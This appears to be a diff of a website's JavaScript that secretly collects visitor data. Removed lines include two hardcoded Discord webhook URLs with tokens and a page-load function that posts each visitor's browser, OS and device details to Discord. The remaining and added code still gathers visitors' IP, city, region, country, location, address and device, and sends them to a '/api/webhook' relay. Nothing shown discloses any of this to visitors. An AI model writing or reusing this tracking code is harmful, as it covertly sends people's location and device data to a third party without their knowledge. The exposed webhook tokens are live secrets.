@@ -1,5 +1,3 @@
-const WEBHOOK_URL = `https://discord.com/api/webhooks/1349523049250291712/wUumjsxHGe6Qyd2G4gUAmb_5OHX7T8U2Nbxkpb4mEjW9xVuZc0Le96jVBOC8rguajQbc`;
-
 function sendToDiscord(ipData, locationData, deviceData) {
   const ip = ipData.ip;
   const city = ipData.city;
@@ -34,20 +32,19 @@ ${addressMessage}
 ${deviceMessage}
 \`\`\``;
 
-  fetch(WEBHOOK_URL, {
+  fetch("/api/webhook", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: message }),
-  })
-    .then((response) => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! status: ${response.status}`);
-      }
-      console.log(`Sent message to Discord with status ${response.status}`);
-    })
-    .catch((error) => {
-      console.error(`Error sending message to Discord: ${error}`);
-    });
+    body: JSON.stringify({
+      ip,
+      city,
+      region,
+      country,
+      locationMessage,
+      addressMessage,
+      deviceMessage,
+    }),
+  });
 }
 
 function getUserLocation(callback) {
@@ -154,70 +151,3 @@ document.addEventListener("DOMContentLoaded", function () {
   // Change subtitle every 6 seconds
   setInterval(changeSubtitle, 6000);
 });
-
-function sendDeviceData() {
-  // Initialize the parser
-  var parser = new UAParser();
-  var result = parser.getResult();
-
-  // Prepare the data to send
-  var data = {
-    content: "",
-    embeds: [
-      {
-        title: "Device Information",
-        fields: [
-          {
-            name: "Browser",
-            value: result.browser.name + " " + result.browser.version,
-            inline: true,
-          },
-          {
-            name: "OS",
-            value: result.os.name + " " + result.os.version,
-            inline: true,
-          },
-          {
-            name: "Device",
-            value: result.device.vendor + " " + result.device.model,
-            inline: true,
-          },
-          {
-            name: "Type",
-            value: result.device.type,
-            inline: true,
-          },
-        ],
-        color: 16711680, // Optional: color of the embed
-      },
-    ],
-  };
-
-  // Send the data to the Discord webhook
-  fetch(
-    "https://discord.com/api/webhooks/1322770741447626855/IzGc7Zr-stzRN5_j2TlxYcNhgfT-bkRTRu6tlD2y1EGtrtx1hLpALbtOBPO1Yj9enZre",
-    {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(data),
-    }
-  )
-    .then((response) => {
-      if (response.ok) {
-        console.log("Device data sent to Discord webhook");
-      } else {
-        console.error(
-          "Error sending data to Discord webhook",
-          response.statusText
-        );
-      }
-    })
-    .catch((error) => {
-      console.error("Error sending data to Discord webhook", error);
-    });
-}
-
-// Call the function to send device data when the page loads
-window.onload = sendDeviceData;
